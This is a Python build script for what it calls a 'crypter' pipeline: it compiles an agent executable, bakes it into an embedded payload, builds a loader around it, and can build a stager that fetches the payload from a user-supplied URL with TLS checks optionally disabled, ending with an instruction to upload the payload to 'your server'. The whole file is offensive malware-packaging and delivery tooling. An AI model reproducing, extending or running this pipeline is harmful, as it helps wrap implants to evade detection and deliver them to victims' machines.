#!/usr/bin/env python3
"""
build.py — crypter build pipeline.

Modes:
    python build.py                           full: agent + bake + loader
    python build.py --bake-only               bake + loader (existing agent.exe)
    python build.py --stub-only               loader only  (existing payload files)
    python build.py --stager-url <url>        full + stager (downloads from url)
    python build.py --bake-only --stager-url <url>
    python build.py --ignore-cert             stager skips TLS cert check
"""
import subprocess
import sys
import os
import shutil
import argparse

ROOT    = os.path.dirname(os.path.abspath(__file__))
AGENT   = os.path.normpath(os.path.join(ROOT, "..", "agent"))
STUB    = os.path.join(ROOT, "stub")
STAGER  = os.path.join(ROOT, "stager")
TOOLS   = os.path.join(ROOT, "tools")
OUTPUT  = os.path.join(ROOT, "output")

def _find(name: str, *fallbacks: str) -> str:
    found = shutil.which(name)
    if found:
        return found
    for fb in fallbacks:
        if os.path.isfile(fb):
            return fb
    raise FileNotFoundError(
        f"Cannot find '{name}'. Install it or add it to PATH."
    )

MAKE   = _find("make",   r"C:\msys64\usr\bin\make.exe")
PYTHON = _find("python", r"C:\msys64\mingw64\bin\python.exe", sys.executable)


def run(cmd: list, cwd: str = None) -> None:
    print(f"[+] {' '.join(str(x) for x in cmd)}")
    r = subprocess.run(cmd, cwd=cwd)
    if r.returncode != 0:
        sys.exit(r.returncode)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--bake-only",   action="store_true")
    ap.add_argument("--stub-only",   action="store_true")
    ap.add_argument("--stager-url",  default=None,
                    help="Build stager that downloads from this URL")
    ap.add_argument("--ignore-cert", action="store_true",
                    help="Stager ignores TLS cert errors")
    args = ap.parse_args()

    agent_bin = os.path.join(AGENT, "agent.exe")

    # 1. build agent
    if not args.bake_only and not args.stub_only:
        run([MAKE, "build-only"], cwd=AGENT)

    # 2. bake
    if not args.stub_only:
        if not os.path.isfile(agent_bin):
            sys.exit(f"[!] agent.exe not found: {agent_bin}")
        bake_cmd = [PYTHON, os.path.join(TOOLS, "bake.py"),
                    agent_bin, "--out-dir", STUB]
        if args.stager_url:
            bake_cmd += ["--stager-url", args.stager_url]
        if args.ignore_cert:
            bake_cmd += ["--ignore-cert"]
        run(bake_cmd)

    # 3. check payload files
    if not os.path.isfile(os.path.join(STUB, "payload_meta.h")) or \
       not os.path.isfile(os.path.join(STUB, "payload.bin")):
        sys.exit(f"[!] payload files missing in {STUB}")

    # 4. build loader (embedded payload)
    run([MAKE], cwd=STUB)

    os.makedirs(OUTPUT, exist_ok=True)
    loader_src = os.path.join(STUB, "loader.exe")
    loader_dst = os.path.join(OUTPUT, "loader.exe")
    shutil.copy2(loader_src, loader_dst)
    print(f"[ok] loader  {os.path.getsize(loader_dst)//1024} KB -> {loader_dst}")

    # 5. build stager (network download) if requested
    if args.stager_url:
        if not os.path.isfile(os.path.join(STAGER, "stager_cfg.h")):
            sys.exit(f"[!] stager_cfg.h missing — bake with --stager-url failed?")
        run([MAKE], cwd=STAGER)
        stager_src = os.path.join(STAGER, "stager.exe")
        stager_dst = os.path.join(OUTPUT, "stager.exe")
        shutil.copy2(stager_src, stager_dst)
        payload_srv = os.path.join(STAGER, "payload.bin")
        print(f"[ok] stager  {os.path.getsize(stager_dst)//1024} KB -> {stager_dst}")
        print(f"[!!] upload {payload_srv} to your server at {args.stager_url}")


if __name__ == "__main__":
    main()
